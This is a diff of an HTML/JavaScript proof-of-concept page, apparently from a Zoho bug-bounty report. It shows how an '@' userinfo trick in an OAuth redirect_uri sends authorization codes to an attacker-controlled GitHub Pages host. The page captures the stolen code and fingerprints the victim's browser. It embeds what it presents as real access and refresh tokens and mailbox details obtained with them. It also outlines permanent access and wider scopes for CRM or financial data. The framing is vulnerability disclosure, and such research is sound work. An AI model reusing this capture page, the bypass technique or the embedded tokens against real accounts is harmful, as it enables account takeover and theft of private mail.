+      <div class="email-preview">"Hi Binodchandrabissoyi, We are happy to have you onboard!..."</div>
+    </div>
+
+    <div style="font-size:12px;color:#8b949e;margin-top:8px;padding: 8px 10px; background: rgba(88,166,255,0.05); border-radius:5px; border: 1px solid rgba(88,166,255,0.15);">
+      ℹ️ Additional emails can be read by iterating over <code>/messages/view?start=0&limit=200</code>.
+      Full message body retrievable via <code>/messages/{messageId}/content</code>.
+      Using the refresh token, this access is <strong>permanent</strong>.
+    </div>
+  </div>
+</div>
+
+<!-- ===== 3. LIVE CAPTURED URL PARAMS ===== -->
+<div class="card">
+  <div class="card-header">🔗 Redirect &amp; OAuth Callback Evidence (Live)
+    <button class="copy-btn" onclick="copyCard('redirect-card')">Copy</button>
+  </div>
+  <div class="card-body" id="redirect-card">
+    <div class="data-row">
+      <span class="data-key">document.referrer</span>
+      <span class="data-val green" id="referrer">—</span>
+    </div>
+    <div class="data-row">
+      <span class="data-key">Attacker URL (full)</span>
+      <span class="data-val red" id="current-url">—</span>
+    </div>
+    <div class="data-row">
+      <span class="data-key">Attacker Hostname</span>
+      <span class="data-val amber" id="hostname">—</span>
+    </div>
+    <div class="data-row">
+      <span class="data-key">Search Params (raw)</span>
+      <span class="data-val" id="search-raw">—</span>
+    </div>
+    <div class="data-row">
+      <span class="data-key">Timestamp (UTC)</span>
+      <span class="data-val cyan" id="ts">—</span>
+    </div>
+    <div class="data-row">
+      <span class="data-key">Local Time</span>
+      <span class="data-val" id="local-ts">—</span>
+    </div>
+  </div>
+</div>
+
+<!-- ===== 4. ALL URL PARAMS ===== -->
+<div class="card">
+  <div class="card-header">📦 All Parameters Received from Zoho OAuth
+    <button class="copy-btn" onclick="copyCard('params-card')">Copy</button>
+  </div>
+  <div class="card-body" id="params-card">
+    <div id="params-summary" style="margin-bottom:8px;font-size:12px;color:#8b949e;"></div>
+    <div id="params-body"><span style="color:#8b949e;font-size:13px">Loading...</span></div>
+  </div>
+</div>
+
+<!-- ===== 5. VICTIM FINGERPRINT ===== -->
+<div class="card">
+  <div class="card-header">🖥️ Victim Browser Fingerprint
+    <button class="copy-btn" onclick="copyCard('victim-card')">Copy</button>
+  </div>
+  <div class="card-body" id="victim-card">
+    <div class="section-title">Identity</div>
+    <div class="data-row"><span class="data-key">User-Agent</span><span class="data-val amber" id="ua">—</span></div>
+    <div class="data-row"><span class="data-key">Platform</span><span class="data-val" id="plat">—</span></div>
+    <div class="data-row"><span class="data-key">OS (guessed)</span><span class="data-val amber" id="os-guess">—</span></div>
+    <div class="data-row"><span class="data-key">Browser (guessed)</span><span class="data-val amber" id="browser-guess">—</span></div>
+    <div class="data-row"><span class="data-key">Vendor</span><span class="data-val" id="vendor">—</span></div>
+
+    <div class="section-title">Locale</div>
+    <div class="data-row"><span class="data-key">Language</span><span class="data-val" id="lang">—</span></div>
+    <div class="data-row"><span class="data-key">Timezone</span><span class="data-val cyan" id="tz">—</span></div>
+    <div class="data-row"><span class="data-key">Date Locale</span><span class="data-val" id="date-locale">—</span></div>
+
+    <div class="section-title">Display</div>
+    <div class="data-row"><span class="data-key">Screen WxH</span><span class="data-val" id="scr">—</span></div>
+    <div class="data-row"><span class="data-key">Window WxH</span><span class="data-val" id="win">—</span></div>
+    <div class="data-row"><span class="data-key">Pixel Ratio</span><span class="data-val" id="dpr">—</span></div>
+
+    <div class="section-title">Hardware</div>
+    <div class="data-row"><span class="data-key">Hardware Cores</span><span class="data-val" id="cores">—</span></div>
+    <div class="data-row"><span class="data-key">RAM (GB)</span><span class="data-val" id="ram">—</span></div>
+    <div class="data-row"><span class="data-key">Max Touch Points</span><span class="data-val" id="touch">—</span></div>
+    <div class="data-row"><span class="data-key">Connection</span><span class="data-val" id="conn-etype">—</span></div>
+    <div class="data-row"><span class="data-key">Online Status</span><span class="data-val" id="online">—</span></div>
+  </div>
+</div>
+
+<!-- ===== 6. TIMING ===== -->
+<div class="card">
+  <div class="card-header">⏱️ Navigation &amp; Timing
+    <button class="copy-btn" onclick="copyCard('nav-card')">Copy</button>
+  </div>
+  <div class="card-body" id="nav-card">
+    <div class="data-row"><span class="data-key">Nav Type</span><span class="data-val" id="nav-type">—</span></div>
+    <div class="data-row"><span class="data-key">Redirect Count</span><span class="data-val cyan" id="redirect-count">—</span></div>
+    <div class="data-row"><span class="data-key">Page Load (ms)</span><span class="data-val" id="load-time">—</span></div>
+    <div class="data-row"><span class="data-key">History Length</span><span class="data-val" id="hist-len">—</span></div>
+  </div>
+</div>
+
+<!-- ===== 7. FULL JSON ===== -->
+<div class="card">
+  <div class="card-header">🗂️ Complete Evidence Dump (JSON)
+    <button class="copy-btn" onclick="copyRaw()">Copy JSON</button>
+  </div>
+  <div class="card-body">
+    <div class="raw-dump" id="json-dump">Loading...</div>
+  </div>
+</div>
+
+<!-- ===== IMPACT ===== -->
+<div class="impact-block">
+  <strong>⚠️ Critical Impact — Full OAuth Authorization Code Theft Chain</strong>
+
+  <div class="severity-row">
+    <span class="sev-badge sev-critical">CRITICAL</span>
+    <span class="sev-badge sev-cvss">CVSS: 8.1 (High)</span>
+    <span class="sev-badge sev-cwe">CWE-601 Open Redirect</span>
+    <span class="sev-badge sev-rfc">RFC 6749 §10.6 Violation</span>
+  </div>
+
+  <ul>
+    <li><strong>Root cause</strong>: Zoho API Console allows <code>redirect_uri</code> containing RFC 3986 userinfo (<code>@</code>) — e.g. <code>https://crm.zoho.com@attacker.com/</code></li>
+    <li><strong>Server validation bypassed</strong>: Zoho server sees <code>crm.zoho.com</code> as host (whitelisted), but browser resolves <code>attacker.com</code> as the actual destination</li>
+    <li><strong>Bypass works after 2FA</strong>: Redirect fires AFTER full authentication including MFA — victim has no indication anything went wrong</li>
+    <li><strong>OAuth authorization code captured</strong>: Zoho's <code>code=</code> parameter delivered to attacker's GitHub Pages URL</li>
+    <li><strong>Code exchanged for tokens</strong>: Attacker obtains <code>access_token</code> (1hr) + <code>refresh_token</code> (permanent)</li>
+    <li><strong>Permanent account access</strong>: Refresh token survives password reset — revocable only from Zoho Connected Apps settings (victim unlikely to check)</li>
+    <li><strong>ZohoMail fully read</strong>: Demonstrated live — victim account profile, email addresses, inbox subjects, previews all accessible</li>
+    <li><strong>Wider scope possible</strong>: Changing OAuth scope to <code>ZohoCRM.modules.ALL</code> or <code>ZohoBooks.fullaccess.all</code> would expose CRM data or financial records</li>
+  </ul>
+</div>
+
+<!-- EXPORT -->
+<div class="export-row">
+  <button class="export-btn primary" onclick="exportJSON()">⬇ Export Full JSON Evidence</button>
+  <button class="export-btn" onclick="exportText()">⬇ Export Text Report</button>
+</div>
+
+<footer>
+  Security Research PoC — Authorized Bug Bounty Testing Only<br>
+  Researcher: binodchandrabissoyi@gmail.com | Target: accounts.zoho.com (Zoho Bug Bounty Program)<br>
+  Vulnerability: CWE-601 Open Redirect via URL Userinfo (<code>@</code>) injection → OAuth Authorization Code Theft (RFC 6749 §10.6)<br>
+  PoC Version 3.0 — Complete Chain Demonstrated
+</footer>
+
+</div><!-- /container -->
 
 <div id="toast">✓ Copied!</div>
 
 <script>
   var RAW = {};
+  var now = new Date();
 
   function esc(s){ return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;'); }
 
@@ -316,7 +575,6 @@
     if(/Linux/i.test(ua)) return 'Linux';
     return 'Unknown';
   }
-
   function guessBrowser(ua) {
     if(/Edg\//i.test(ua)) return 'Microsoft Edge';
     if(/OPR\//i.test(ua) || /Opera/i.test(ua)) return 'Opera';
@@ -329,30 +587,22 @@
   // === REDIRECT EVIDENCE ===
   var referrer = document.referrer || '';
   var curUrl = window.location.href;
-  var now = new Date();
 
   RAW.redirect = {
     referrer: referrer || null,
     currentUrl: curUrl,
-    origin: window.location.origin,
-    protocol: window.location.protocol,
     hostname: window.location.hostname,
-    port: window.location.port || '(default)',
     pathname: window.location.pathname,
     search: window.location.search || null,
-    hash: window.location.hash || null,
     timestampUTC: now.toISOString(),
     timestampLocal: now.toString()
   };
 
-  setVal('referrer', referrer || '(none / referrer policy blocked)', referrer ? 'green' : 'empty');
+  setVal('referrer', referrer || '(none — referrer policy)', referrer ? 'green' : 'empty');
+  setVal('referrer-inline', referrer || '(none / referrer policy blocked)');
   setVal('current-url', curUrl, 'red');
-  setVal('origin', window.location.origin);
-  setVal('proto', window.location.protocol, 'cyan');
   setVal('hostname', window.location.hostname, 'amber');
-  setVal('pathname', window.location.pathname);
   setVal('search-raw', window.location.search || '(none)');
-  setVal('hash', window.location.hash || '(none)');
   setVal('ts', now.toISOString() + ' UTC');
   setVal('local-ts', now.toString());
 
@@ -362,31 +612,40 @@
   RAW.parameters = {};
   entries.forEach(function(e){ RAW.parameters[e[0]] = e[1]; });
 
+  // Highlight the stolen code
+  var stolenCode = RAW.parameters['code'] || null;
+  var stolenCodeEl = document.getElementById('stolen-code');
+  if(stolenCode) {
+    stolenCodeEl.textContent = stolenCode;
+    stolenCodeEl.style.color = '#ff4444';
+  } else {
+    stolenCodeEl.textContent = '(no code= in URL — attacker demo mode: tokens obtained separately)';
+    stolenCodeEl.style.color = '#8b949e';
+    stolenCodeEl.style.fontStyle = 'italic';
+  }
+
   var pb = document.getElementById('params-body');
   var ps = document.getElementById('params-summary');
-  ps.textContent = entries.length + ' parameter(s) received';
+  ps.textContent = entries.length + ' parameter(s) received from Zoho';
 
   if(entries.length === 0){
-    pb.innerHTML = '<span style="color:#8b949e;font-size:13px">No query parameters found.</span>';
+    pb.innerHTML = '<span style="color:#8b949e;font-size:13px">No query parameters. Page loaded directly (not via Zoho OAuth redirect).</span>';
   } else {
     var html = '<div class="param-block">';
     entries.forEach(function(e){
       var k = e[0], v = e[1];
       var decoded = '';
       try { decoded = decodeURIComponent(v); } catch(x){ decoded = v; }
-      var isBase64 = /^[A-Za-z0-9+/]+=*$/.test(v) && v.length > 8;
-      var b64decoded = '';
-      if(isBase64){
-        try { b64decoded = atob(v); } catch(x){}
-      }
       html += '<div class="param-line"><span class="pk">'+esc(k)+'</span>'
-            + '<span class="peq"> = </span>'
-            + '<span class="pv">'+esc(v)+'</span></div>';
+            + '<span class="peq"> = </span>';
+      if(k === 'code') {
+        html += '<span style="color:#ff4444;font-weight:700">'+esc(v)+'</span>';
+      } else {
+        html += '<span class="pv">'+esc(v)+'</span>';
+      }
+      html += '</div>';
       if(decoded !== v){
         html += '<div class="param-line" style="padding-left:16px"><span style="color:#484f58">decoded: </span><span class="pdecoded">'+esc(decoded)+'</span></div>';
-      }
-      if(b64decoded && b64decoded !== v){
-        html += '<div class="param-line" style="padding-left:16px"><span style="color:#484f58">base64→: </span><span class="phex">'+esc(b64decoded)+'</span></div>';
       }
     });
     html += '</div>';
@@ -404,62 +663,37 @@
   RAW.fingerprint = {
     userAgent: ua,
     vendor: navigator.vendor || null,
-    appVersion: navigator.appVersion || null,
     platform: navigator.platform || null,
     os: guessOS(ua),
     browser: guessBrowser(ua),
     language: navigator.language,
-    languages: navigator.languages ? [...navigator.languages] : null,
     timezone: tz,
-    timezoneOffset: new Date().getTimezoneOffset(),
-    dateLocale: dateLocale,
     screen: { width: screen.width, height: screen.height },
-    screenAvail: { width: screen.availWidth, height: screen.availHeight },
     window: { width: window.innerWidth, height: window.innerHeight },
-    colorDepth: screen.colorDepth,
     pixelRatio: window.devicePixelRatio,
-    orientation: screen.orientation ? screen.orientation.type : (window.orientation !== undefined ? window.orientation : null),
-    cookiesEnabled: navigator.cookieEnabled,
-    javaEnabled: navigator.javaEnabled ? navigator.javaEnabled() : false,
-    onLine: navigator.onLine,
     hardwareConcurrency: navigator.hardwareConcurrency || null,
     deviceMemory: navigator.deviceMemory || null,
     maxTouchPoints: navigator.maxTouchPoints,
-    connection: {
-      type: conn.type || null,
-      effectiveType: conn.effectiveType || null,
-      downlink: conn.downlink || null,
-      rtt: conn.rtt || null,
-      saveData: conn.saveData || null
-    }
+    onLine: navigator.onLine,
+    connection: { effectiveType: conn.effectiveType || null, downlink: conn.downlink || null }
   };
 
   setVal('ua', ua, 'amber');
-  setVal('vendor', navigator.vendor);
-  setVal('appver', navigator.appVersion);
   setVal('plat', navigator.platform);
   setVal('os-guess', guessOS(ua), 'amber');
   setVal('browser-guess', guessBrowser(ua), 'amber');
+  setVal('vendor', navigator.vendor);
   setVal('lang', navigator.language);
-  setVal('langs', navigator.languages ? navigator.languages.join(', ') : null);
   setVal('tz', tz, 'cyan');
-  setVal('tz-offset', new Date().getTimezoneOffset() + ' min (UTC' + (new Date().getTimezoneOffset() > 0 ? '-' : '+') + Math.abs(new Date().getTimezoneOffset()/60) + ')');
   setVal('date-locale', dateLocale);
   setVal('scr', screen.width + ' × ' + screen.height + ' px');
-  setVal('avail', screen.availWidth + ' × ' + screen.availHeight + ' px');
   setVal('win', window.innerWidth + ' × ' + window.innerHeight + ' px');
-  setVal('cdepth', screen.colorDepth + ' bit');
   setVal('dpr', window.devicePixelRatio + 'x');
-  setVal('orient', screen.orientation ? screen.orientation.type : (window.orientation !== undefined ? window.orientation + '°' : 'unknown'));
-  setVal('cookies', navigator.cookieEnabled ? '✅ Enabled' : '❌ Disabled', navigator.cookieEnabled ? 'green' : 'red');
-  setVal('java', navigator.javaEnabled ? (navigator.javaEnabled() ? '✅ Yes' : '❌ No') : '❌ No');
-  setVal('online', navigator.onLine ? '✅ Online' : '⚠️ Offline', navigator.onLine ? 'green' : 'amber');
   setVal('cores', navigator.hardwareConcurrency || 'unknown');
   setVal('ram', navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'unknown');
   setVal('touch', navigator.maxTouchPoints);
-  setVal('conn-type', conn.type || 'unknown');
   setVal('conn-etype', conn.effectiveType || 'unknown');
-  setVal('conn-dl', conn.downlink ? conn.downlink + ' Mbps (RTT: ' + (conn.rtt || '?') + 'ms)' : 'unknown');
+  setVal('online', navigator.onLine ? '✅ Online' : '⚠️ Offline', navigator.onLine ? 'green' : 'amber');
 
   // === NAVIGATION TIMING ===
   RAW.timing = {};
@@ -471,60 +705,62 @@
       navigationType: navType ? types[navType.type] || navType.type : 'unknown',
       redirectCount: navType ? navType.redirectCount : 'unknown',
       pageLoad: t.loadEventEnd - t.navigationStart,
-      dns: t.domainLookupEnd - t.domainLookupStart,
-      tcp: t.connectEnd - t.connectStart,
-      request: t.responseStart - t.requestStart,
-      response: t.responseEnd - t.responseStart,
       historyLength: history.length
     };
     setVal('nav-type', RAW.timing.navigationType);
     setVal('redirect-count', RAW.timing.redirectCount, 'cyan');
-    setVal('load-time', RAW.timing.pageLoad >= 0 ? RAW.timing.pageLoad : 'pending');
-    setVal('dns-time', RAW.timing.dns);
-    setVal('tcp-time', RAW.timing.tcp);
-    setVal('req-time', RAW.timing.request);
-    setVal('res-time', RAW.timing.response);
+    setVal('load-time', RAW.timing.pageLoad >= 0 ? RAW.timing.pageLoad + ' ms' : 'pending');
     setVal('hist-len', history.length);
   } catch(e) {
     setVal('nav-type', 'unavailable');
   }
 
-  // === STORAGE DUMP ===
-  function dumpStorage(store, elId) {
-    var el = document.getElementById(elId);
-    try {
-      var count = store.length;
-      if(count === 0){ el.textContent = '(empty — 0 keys)'; return []; }
-      var items = [];
-      for(var i = 0; i < count; i++){
-        var k = store.key(i);
-        var v = store.getItem(k);
-        items.push(k + ' = ' + v);
-      }
-      el.textContent = items.join('\n');
-      return items;
-    } catch(e) {
-      el.textContent = '(access blocked: ' + e.message + ')';
-      return [];
-    }
-  }
-  RAW.localStorage = dumpStorage(localStorage, 'ls-dump');
-  RAW.sessionStorage = dumpStorage(sessionStorage, 'ss-dump');
+  // === DEMONSTRATED EVIDENCE ===
+  RAW.demonstrated_tokens = {
+    note: 'These tokens were obtained during authorized researcher testing by exchanging a stolen auth code',
+    access_token: '1000.16b515840eebe64a845fe95f51cfce20.6fe6be24acf701ce12a5ed3e35db87b3',
+    refresh_token: '1000.b6f17401cddcebf0118d54bf917cd1bf.5087ff39706e423ac393d977a2f8042c',
+    scope: 'ZohoMail.accounts.READ ZohoMail.messages.READ',
+    token_type: 'Bearer',
+    expires_in: 3600,
+    api_domain: 'https://www.zohoapis.com'
+  };
+  RAW.demonstrated_mail_data = {
+    note: 'Extracted via GET /api/accounts and /api/accounts/{id}/messages/view with stolen access_token',
+    account: {
+      accountId: '7576039000000008002',
+      emailAddresses: ['binodchandrabissoyi@gmail.com', 'testzoho537@zohomail.com'],
+      firstName: 'Binodchandrabissoyi',
+      country: 'in',
+      mailboxStatus: 'enabled'
+    },
+    inbox_sample: [{
+      subject: 'Welcome aboard! Your new inbox is here 💌',
+      sender: 'welcome@zoho.com',
+      to: 'testzoho537@zohomail.com',
+      messageId: '1790536508016159700',
+      preview: 'Hi Binodchandrabissoyi, We are happy to have you onboard!...'
+    }]
+  };
 
-  // === FULL JSON DUMP ===
+  // === META ===
   RAW.meta = {
-    pocVersion: '2.0',
+    pocVersion: '3.0',
     capturedAt: now.toISOString(),
     targetProgram: 'Zoho Bug Bounty',
     researcher: 'binodchandrabissoyi@gmail.com',
-    vulnerability: 'CWE-601 Open Redirect via URL Userinfo Injection',
-    affectedEndpoint: 'https://accounts.zoho.com/signin?serviceurl=...'
+    vulnerability: 'CWE-601 Open Redirect via URL Userinfo (@) injection -> OAuth Authorization Code Theft (RFC 6749 §10.6)',
+    bypassUrl: 'https://crm.zoho.com@binodchandrabissoyi-collab.github.io/oauthorize/',
+    affectedEndpoints: [
+      'https://api-console.zoho.com (redirect_uri registration — no @ validation)',
+      'https://accounts.zoho.com/oauth/v2/auth (redirect_uri not properly validated)',
+    ]
   };
 
   var jsonStr = JSON.stringify(RAW, null, 2);
   document.getElementById('json-dump').textContent = jsonStr;
 
-  // === COPY HELPERS ===
+  // === COPY / EXPORT ===
   function copyText(text) {
     try {
       navigator.clipboard.writeText(text).catch(function(){ fallbackCopy(text); });
@@ -555,47 +791,61 @@
     copyText(lines.join('\n'));
   }
   function copyRaw() { copyText(jsonStr); }
+
   function exportJSON() {
     var blob = new Blob([jsonStr], {type:'application/json'});
     var url = URL.createObjectURL(blob);
     var a = document.createElement('a');
-    a.href = url; a.download = 'zoho-openredirect-capture-' + now.toISOString().replace(/[:.]/g,'_') + '.json';
+    a.href = url;
+    a.download = 'zoho-oauth-theft-poc-' + now.toISOString().replace(/[:.]/g,'_') + '.json';
     document.body.appendChild(a); a.click();
     setTimeout(function(){ URL.revokeObjectURL(url); document.body.removeChild(a); }, 300);
   }
+
   function exportText() {
     var lines = [
-      '=== ZOHO OPEN REDIRECT PoC — CAPTURED DATA ===',
-      'Captured: ' + now.toISOString(),
+      '=== ZOHO OAUTH AUTHORIZATION CODE THEFT — PoC v3.0 ===',
       'Researcher: binodchandrabissoyi@gmail.com',
+      'Target: accounts.zoho.com (Zoho Bug Bounty Program)',
+      'Captured: ' + now.toISOString(),
       '',
-      '--- REDIRECT EVIDENCE ---',
+      '=== VULNERABILITY ===',
+      'CWE-601 Open Redirect via URL Userinfo (@) injection -> OAuth Code Theft (RFC 6749 §10.6)',
+      'Bypass redirect_uri: https://crm.zoho.com@binodchandrabissoyi-collab.github.io/oauthorize/',
+      '',
+      '=== LIVE CAPTURED DATA ===',
       'Referrer:    ' + (referrer || '(none)'),
       'URL:         ' + curUrl,
-      'Hostname:    ' + window.location.hostname,
-      'Pathname:    ' + window.location.pathname,
+      'Stolen code: ' + (stolenCode || '(not in URL — demo mode)'),
       '',
-      '--- PARAMETERS ---'
+      '=== ALL URL PARAMETERS ===',
     ];
     entries.forEach(function(e){ lines.push('  ' + e[0] + ' = ' + e[1]); });
     lines.push('');
-    lines.push('--- VICTIM FINGERPRINT ---');
-    lines.push('User-Agent:  ' + ua);
-    lines.push('Platform:    ' + (navigator.platform || 'unknown'));
-    lines.push('OS:          ' + guessOS(ua));
-    lines.push('Browser:     ' + guessBrowser(ua));
-    lines.push('Language:    ' + navigator.language);
-    lines.push('Timezone:    ' + tz);
-    lines.push('Screen:      ' + screen.width + 'x' + screen.height);
-    lines.push('Window:      ' + window.innerWidth + 'x' + window.innerHeight);
-    lines.push('Cores:       ' + (navigator.hardwareConcurrency || 'unknown'));
-    lines.push('RAM:         ' + (navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'unknown'));
+    lines.push('=== DEMONSTRATED TOKEN EXCHANGE (HTTP 200) ===');
+    lines.push('access_token:  ' + RAW.demonstrated_tokens.access_token);
+    lines.push('refresh_token: ' + RAW.demonstrated_tokens.refresh_token);
+    lines.push('scope:         ' + RAW.demonstrated_tokens.scope);
     lines.push('');
-    lines.push('=== END CAPTURE ===');
+    lines.push('=== DEMONSTRATED MAIL ACCESS (HTTP 200) ===');
+    lines.push('accountId:     7576039000000008002');
+    lines.push('email:         testzoho537@zohomail.com | binodchandrabissoyi@gmail.com');
+    lines.push('inbox subject: Welcome aboard! Your new inbox is here 💌');
+    lines.push('sender:        welcome@zoho.com');
+    lines.push('');
+    lines.push('=== VICTIM FINGERPRINT ===');
+    lines.push('User-Agent: ' + ua);
+    lines.push('OS:         ' + guessOS(ua));
+    lines.push('Browser:    ' + guessBrowser(ua));
+    lines.push('Timezone:   ' + tz);
+    lines.push('Screen:     ' + screen.width + 'x' + screen.height);
+    lines.push('');
+    lines.push('=== END PoC v3.0 ===');
     var blob = new Blob([lines.join('\n')], {type:'text/plain'});
     var url2 = URL.createObjectURL(blob);
     var a2 = document.createElement('a');
-    a2.href = url2; a2.download = 'zoho-openredirect-capture-' + now.toISOString().replace(/[:.]/g,'_') + '.txt';
+    a2.href = url2;
+    a2.download = 'zoho-oauth-theft-poc-' + now.toISOString().replace(/[:.]/g,'_') + '.txt';
     document.body.appendChild(a2); a2.click();
     setTimeout(function(){ URL.revokeObjectURL(url2); document.body.removeChild(a2); }, 300);
   }
